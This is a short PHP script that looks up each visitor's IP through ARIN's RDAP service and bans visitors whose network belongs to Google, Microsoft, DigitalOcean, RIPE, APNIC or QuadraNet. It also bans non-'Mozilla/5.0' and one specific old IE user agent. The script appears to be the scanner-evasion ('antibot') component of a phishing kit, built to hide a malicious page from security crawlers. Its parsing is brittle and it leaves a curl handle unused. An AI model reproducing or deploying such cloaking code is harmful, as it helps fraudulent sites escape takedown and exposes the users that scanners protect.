<?php

$ip = $_SERVER['REMOTE_ADDR'];
$url = "https://rdap.arin.net/registry/ip/".$ip;
$ch = curl_init($url);
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_HEADER, 0);
curl_setopt($curl, CURLOPT_POST, 0);
$data = curl_exec($curl);
curl_close($curl);
$data = explode(",", $data);
@$data = str_replace('"name" : ','',$data[25]);
$data = preg_replace("/\n/","",$data);
$data = preg_replace("/ /","",$data);
$data = str_replace('"','',$data);
$data = explode('-',$data);
$final = $data[0];
$bad_names = array("GOOGLE","DIGITALOCEAN","RIPE","APNIC","MSFT","QUADRANET");
if(in_array($final, $bad_names)){logbot('BANNED REGISTRY');banbot();};
  
///////////////////0000000000000000
if ($_SERVER['HTTP_USER_AGENT'] == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {logbot('BANNED USER AGENT');banbot();};
if (substr($_SERVER['HTTP_USER_AGENT'],0,strlen('Mozilla/5.0')) !== "Mozilla/5.0") {logbot('BOT USER AGENT');banbot();};


?>